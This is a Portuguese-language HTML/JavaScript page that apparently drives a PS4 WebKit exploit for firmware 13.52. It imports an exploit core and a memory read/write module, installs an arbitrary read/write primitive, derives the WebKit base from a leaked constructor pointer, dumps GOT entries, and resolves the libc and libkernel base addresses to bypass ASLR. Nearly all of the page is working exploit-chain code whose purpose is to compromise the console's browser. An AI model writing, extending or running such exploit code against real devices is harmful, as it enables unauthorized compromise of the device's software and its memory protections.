
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS4 WebKit Exploit (13.52 — bases estilo slopkit)</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:14px}
h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
  margin-bottom:4px;text-align:center}
#fw{font-size:11px;color:#444;margin-bottom:12px;text-align:center}
#sb{width:100%;max-width:720px;background:#0c0e18;border:1px solid #1a1d2e;
  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0;transition:background .3s}
#dot.r{background:#f0a500;animation:p 1s infinite}
#dot.ok{background:#00c853}
#dot.e{background:#ff4444}
@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
#st{font-size:12px;color:#bbb;flex:1}
#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
  font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
#con{width:100%;max-width:720px;height:280px;background:#050508;
  border:1px solid #161825;border-radius:6px;overflow-y:auto;
  padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
.e{color:#ff5252;font-weight:bold}.d{color:#555}.a{color:#bd93f9}
.s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;
  padding-top:5px;letter-spacing:1px}
#cards{width:100%;max-width:720px;display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
.card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
.card .cv{font-size:12px;color:#bd93f9}
.card .cv.na{color:#222}
#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
  border-bottom:1px solid #0a2a15;padding-bottom:4px}
</style>
</head>
<body>
<h1>PS4 WebKit Exploit (13.52)</h1>
<div id="fw">detectando...</div>
<div id="sb"><div id="dot" class="r"></div><div id="st">Inicializando...</div></div>
<div id="bars"><span id="ba">tentativa: 1</span><span id="bg">estágio: init</span></div>
<div id="con"></div>
<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
  <div class="card"><div class="cl">Status</div><div class="cv na" id="c-g">Aguardando</div></div>
</div>
<div id="cbox"><div class="ct">// === STATUS ===</div><div id="c-out"></div></div>

<script src="./13.52.js?v=6"></script>
<script type="module">
import { int64 } from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP } from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 700) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

function isUserModulePtr(v) {
  // ponteiro típico PS4 usermode: 0x8xxxxxxx_xxxxxxxx
  if (!v || typeof v.hi !== 'number') return false;
  // hi costuma ser 0x8 para banda alta
  const hi = v.hi >>> 0;
  const lo = v.low >>> 0;
  // aceita 0x800000000 .. 0x8ffffffff roughly
  if (hi >= 0x8 && hi <= 0x8f) return true;
  // alguns firmwares usam 0x7 / outros — rejeita lixo óbvio
  if (hi === 0 && lo > 0x10000) return false;
  return false;
}

function looksLikeCodeQword(v) {
  // heurística: se low byte parece opcode comum no meio de texto
  const lo = v.low >>> 0;
  const b0 = lo & 0xff;
  // valores totalmente fora de 0x8... já são suspeitos
  return !isUserModulePtr(v);
}

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? ('PlayStation 4 — firmware ' + fw[1]) : ('UA: ' + ua.slice(0, 40));
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + String(tag).toLowerCase();
        log('[' + tag + '] ' + detail, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }
  log('[+] core.js OK', 'ok');

  setStatus('Instalando R/W...', 'r');
  logH('R/W (mem.js)');
  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => log('  [mem/' + tag + '] ' + detail, 'd')
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }
  log('[+] window.p instalado', 'ok');

  // ─── WebKit base (estilo slopkit) ───
  logH('WEBKIT BASE (host constructor)');
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
    log('[-] __ps5NativeCtor ausente', 'e');
    setStatus('Sem NativeCtor', 'e');
    return;
  }

  const candidates = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined'
    && OFFSET_wk_host_constructor_candidates.length)
    ? OFFSET_wk_host_constructor_candidates
    : [0x36F9E20];

  let webkitBase = null;
  let usedHc = 0;
  for (let i = 0; i < candidates.length; i++) {
    const hc = candidates[i];
    const wb = ctor - hc;
    // slopkit: banda user-module + alinhamento 0x4000
    if (wb >= 0x800000000 && wb < 0x900000000 && (wb % 0x4000) === 0) {
      const hi = Math.floor(wb / 0x100000000);
      const lo = wb - hi * 0x100000000;
      webkitBase = new int64(lo >>> 0, hi >>> 0);
      usedHc = hc;
      log('[+] candidato hc=0x' + hc.toString(16) + ' → base=0x' + wb.toString(16), 'ok');
      break;
    } else {
      log('[!] rejeitado hc=0x' + hc.toString(16) + ' wb=0x' + wb.toString(16)
        + ' (banda/align)', 'w');
    }
  }
  if (!webkitBase) {
    log('[-] nenhum host-constructor válido', 'e');
    setStatus('WebKit base inválida', 'e');
    return;
  }
  setCard('c-wk', '0x' + webkitBase.toString(16));
  log('[+] WebKit base = 0x' + webkitBase.toString(16) + ' (hc=0x' + usedHc.toString(16) + ')', 'ok');

  // ─── Validar: ler no endereço do ctor ───
  logH('VALIDAR BASE');
  try {
    const ctorI64 = new int64((ctor % 0x100000000) >>> 0, Math.floor(ctor / 0x100000000) >>> 0);
    const atCtor = p.read8(ctorI64);
    log('[*] qword@ctor = 0x' + atCtor.toString(16));
    // mesmo endereço via base+offset
    const viaBase = webkitBase.add32(usedHc);
    log('[*] ctor via base+hc = 0x' + viaBase.toString(16)
      + (viaBase.toString(16) === ctorI64.toString(16) ? ' (match addr)' : ' (DIFF addr)'));
    const atVia = p.read8(viaBase);
    log('[*] qword@base+hc = 0x' + atVia.toString(16)
      + (atVia.toString(16) === atCtor.toString(16) ? ' MATCH' : ' DIFF'));
    if (atVia.toString(16) === atCtor.toString(16)) {
      log('[+] Base consistente com o ctor', 'ok');
    } else {
      log('[!] Leitura base+hc ≠ ctor — base ou R/W em código suspeito', 'w');
    }
  } catch (e) {
    log('[-] validação ctor: ' + (e && e.message ? e.message : e), 'e');
  }

  // ─── Offsets ───
  const off_memset_imp = (typeof OFFSET_wk_memset_import !== 'undefined') ? OFFSET_wk_memset_import : 0;
  const off_guard_imp  = (typeof OFFSET_wk___stack_chk_guard_import !== 'undefined')
    ? OFFSET_wk___stack_chk_guard_import
    : ((typeof OFFSET_wk___stack_chk_fail_import !== 'undefined') ? OFFSET_wk___stack_chk_fail_import : 0);
  const off_lc_memset  = (typeof OFFSET_lc_memset !== 'undefined') ? OFFSET_lc_memset : 0;
  // preferir guard DATA se existir; senão fail função
  const off_lk_guard   = (typeof OFFSET_lk___stack_chk_guard_data !== 'undefined' && OFFSET_lk___stack_chk_guard_data)
    ? OFFSET_lk___stack_chk_guard_data
    : ((typeof OFFSET_lk___stack_chk_guard !== 'undefined') ? OFFSET_lk___stack_chk_guard : 0);
  const off_lk_fail    = (typeof OFFSET_lk___stack_chk_fail !== 'undefined') ? OFFSET_lk___stack_chk_fail : 0;

  logH('OFFSETS (13.52.js)');
  log('  wk_memset_import = 0x' + off_memset_imp.toString(16));
  log('  wk_guard/fail_imp = 0x' + off_guard_imp.toString(16));
  log('  lc_memset         = 0x' + off_lc_memset.toString(16));
  log('  lk_guard/fail     = 0x' + off_lk_guard.toString(16) + ' / fail 0x' + off_lk_fail.toString(16));

  // ─── Dump GOT (diagnóstico) ───
  // PLTGOT de referência no dump 13.00: 0x3CB8BE0
  logH('DUMP GOT (diagnóstico)');
  const pltgot = 0x3CB8BE0;
  let goodPtrs = [];
  try {
    for (let i = 0; i < 24; i++) {
      const off = pltgot + i * 8;
      const slot = webkitBase.add32(off);
      let val;
      try {
        val = p.read8(slot);
      } catch (e) {
        log('  [!] read falhou @ +0x' + off.toString(16), 'w');
        break;
      }
      const ok = isUserModulePtr(val);
      if (ok) goodPtrs.push({ off: off, val: val });
      if (i < 8 || ok) {
        log('  GOT+0x' + off.toString(16) + ' = 0x' + val.toString(16) + (ok ? '  << ptr?' : ''), ok ? 'ok' : 'd');
      }
    }
    log('[*] ponteiros com cara de módulo neste dump: ' + goodPtrs.length);
  } catch (e) {
    log('[-] dump GOT: ' + (e && e.message ? e.message : e), 'e');
  }

  // ─── Resolver bases (estilo slopkit) ───
  logH('MODULE BASES (slopkit-style)');
  let libcBase = null;
  let libKernelBase = null;

  if (off_memset_imp && off_lc_memset) {
    try {
      const ptr = p.read8(webkitBase.add32(off_memset_imp));
      log('[*] GOT memset = 0x' + ptr.toString(16) + (isUserModulePtr(ptr) ? ' OK' : ' (não parece ptr)'), isUserModulePtr(ptr) ? 'ok' : 'w');
      if (isUserModulePtr(ptr)) {
        libcBase = ptr.sub32(off_lc_memset);
        log('[+] libcBase = 0x' + libcBase.toString(16), 'ok');
        setCard('c-lc', '0x' + libcBase.toString(16));
      } else {
        setCard('c-lc', 'GOT inválido');
      }
    } catch (e) {
      log('[-] memset GOT: ' + (e && e.message ? e.message : e), 'e');
      setCard('c-lc', 'erro');
    }
  }

  if (off_guard_imp && (off_lk_guard || off_lk_fail)) {
    try {
      const ptr = p.read8(webkitBase.add32(off_guard_imp));
      log('[*] GOT guard/fail = 0x' + ptr.toString(16) + (isUserModulePtr(ptr) ? ' OK' : ' (não parece ptr)'), isUserModulePtr(ptr) ? 'ok' : 'w');
      if (isUserModulePtr(ptr)) {
        // tenta fail primeiro se o slot for o de fail; senão guard data
        const use = off_lk_fail || off_lk_guard;
        libKernelBase = ptr.sub32(use);
        log('[+] libkernelBase = 0x' + libKernelBase.toString(16) + ' (sub 0x' + use.toString(16) + ')', 'ok');
        setCard('c-lk', '0x' + libKernelBase.toString(16));
      } else {
        setCard('c-lk', 'GOT inválido');
      }
    } catch (e) {
      log('[-] guard GOT: ' + (e && e.message ? e.message : e), 'e');
      setCard('c-lk', 'erro');
    }
  }

  // ─── Resumo ───
  const cbox = document.getElementById('cbox');
  cbox.style.display = 'block';
  document.getElementById('c-out').textContent =
      'WebKit Base    = 0x' + webkitBase.toString(16) + '\n' +
      'libkernel Base = ' + (libKernelBase ? '0x' + libKernelBase.toString(16) : 'N/A') + '\n' +
      'libSceLibc Base= ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
      'GOT ptrs OK    = ' + goodPtrs.length + ' / 24 amostrados\n' +
      '\nSe GOT inválido: offsets 13.00 ≠ WebKit 13.52 runtime.\n' +
      'Mande o log do DUMP GOT.';

  if (libcBase && libKernelBase && isUserModulePtr(libcBase) && isUserModulePtr(libKernelBase)) {
    setStatus('Bases resolvidas', 'ok');
    setCard('c-g', 'OK');
  } else if (goodPtrs.length > 0) {
    setStatus('Base WK OK; GOT com alguns ptrs — offsets a ajustar', 'w');
    setCard('c-g', 'parcial');
  } else {
    setStatus('GOT sem ponteiros válidos — offsets/build mismatch?', 'w');
    setCard('c-g', 'GOT lixo');
  }
}

main().catch(function (e) {
  log('[FATAL] ' + (e && e.message ? e.message : e), 'e');
  setStatus('Erro fatal', 'e');
});
</script>
</body>
</html>
